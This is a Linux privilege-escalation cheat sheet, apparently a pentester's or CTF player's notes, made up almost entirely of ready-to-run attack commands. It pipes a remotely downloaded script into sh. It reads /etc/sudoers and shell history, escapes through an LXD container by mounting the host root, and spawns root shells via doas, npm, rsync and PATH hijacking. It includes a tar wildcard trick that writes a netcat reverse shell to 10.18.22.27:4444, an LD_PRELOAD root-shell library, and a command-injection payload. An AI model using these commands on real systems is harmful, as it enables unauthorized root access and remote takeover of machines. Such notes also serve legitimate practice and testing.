# information gathering

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cat /proc/version
cat /etc/issue
cat /etc/sudoers
ps aux | grep cron
ps
env
ip route
uname -a
netstat # -at -l -t -tp -i
netstat -tupln | grep LISTEN
ss -atur
find / -writable 2>/dev/null
find / -mtime 10 #find files that were modified in the last 10 days
find . -name flag.txt
find / -type d -name config #find the directory named config under “/”
find / -type f -user <user> 2>/dev/null #find files owned by user
find / -type f -perm /4000 2>/dev/null
find / -type f -group <group> -exec ls -l {} + 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/exports #file sharing
nmap --script=vuln <ip>
cat /proc/1/cgroup #if u in docker
cat /etc/exports
```
## quik one-line bash script with colorful output to enumerate linux machine

```bash
for cmd in "history" "id" "echo $PATH" "cat /etc/crontab" "sudo -V " "cat /proc/version" "cat /etc/issue" "cat /etc/sudoers" "cat /etc/sudoers.d" "env" "ip route" "uname -a" "netstat -tupln | grep LISTEN" "find / -type f -perm /4000 2>/dev/null" "getcap -r / 2>/dev/null" "cat /etc/exports" "cat /proc/1/cgroup"; do echo  "\n\033[1;34mCommand: $cmd\033[0m"; echo "\033[1;32m$(eval $cmd)\033[0m"; echo  "\033[1;33m\n===================================================================================================\n==================================================================================================="; done
```
---
# LXD container exploitation

```bash
wget archive
lxc image import ./lxd.tar.gz --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```

```sh
Would you like to use LXD clustering? (yes/no) [default=no]: no
Do you want to configure a new storage pool? (yes/no) [default=yes]: yes
Name of the new storage pool [default=default]: 
Name of the storage backend to use (btrfs, dir, lvm) [default=btrfs]: dir
Would you like to connect to a MAAS server? (yes/no) [default=no]: no
Would you like to create a new network bridge? (yes/no) [default=yes]: yes
What should the new bridge be called? [default=lxdbr0]: 
What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: 
What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none
Would you like a YAML "lxd init" preseed to be printed? (yes/no) [default=no]: 
ubuntu@ajkavanagh-bionic-test:~$ lxc storage list
```
---
# with doas

```bash
doas -u root openssl enc -in file
doas -u root /bin/bash
```
---
# with npm -u

```bash
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
```
---
# PATH

```bash
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
./app_that_calls_curl
```

---
# tar

```bash
cat > /home/andre/backup/rev << EOF
#!/bin/bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
EOF
echo "" > "/home/andre/backup/--checkpoint=1"
echo "" > "/home/andre/backup/--checkpoint-action=exec=sh rev"
chmod +x rev
```
---
# env_keep += LD_PRELOAD

```bash
cd /tmp
cat > shell.c << EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
EOF
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/sky_backup_utility
```
---
# doas
```
doas rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
```
---
# pingsys
```
/usr/bin/pingsys '127.0.0.1; /bin/sh'
```
---
# links
* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [linEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
* [GTFOBins (unix)](https://gtfobins.github.io/)
* [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
* [linux backdoors](./linux_backdoors.md)